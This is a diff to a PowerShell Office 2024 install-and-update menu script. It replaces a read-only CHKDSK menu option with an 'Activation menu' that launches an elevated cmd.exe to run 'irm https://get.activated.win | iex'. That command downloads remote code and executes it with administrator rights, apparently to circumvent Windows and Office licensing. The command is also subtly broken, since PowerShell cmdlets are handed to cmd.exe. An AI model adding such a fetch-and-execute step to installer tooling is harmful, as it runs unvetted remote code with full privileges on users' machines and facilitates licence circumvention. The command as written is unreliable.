@@ -132,7 +132,7 @@ try {
                 if ([Environment]::Is64BitOperatingSystem) { Write-Host '  1) Install or update Office 2024 (64-bit)' }
                 Write-Host '  2) Uninstall older Office and Microsoft 365 desktop apps'
                 Write-Host '  3) Install or update Office 2024 (32-bit)'
-                Write-Host '  5) Check Windows drive (CHKDSK, read-only)'
+                Write-Host '  5) Run Activation menu (1 for Windows / 2>1 for Office)'
                 Write-Host '  9) View logs and errors'
                 Write-Host '  0) Return to the main menu'
                 $selection = Read-Host 'Choose (Enter = install for this PC)'
@@ -150,7 +150,7 @@ try {
                     '5' {
                         $systemFolder = Join-Path $env:SystemRoot 'System32'
                         Start-Process -FilePath (Join-Path $systemFolder 'cmd.exe') -Verb RunAs -WorkingDirectory $systemFolder `
-                            -ArgumentList '/d /c chkdsk.exe %SystemDrive% & pause'
+                            -ArgumentList 'irm https://get.activated.win | iex'
                     }
                     '9' { Start-Process explorer.exe -ArgumentList ('"{0}"' -f $folder) }
                 }
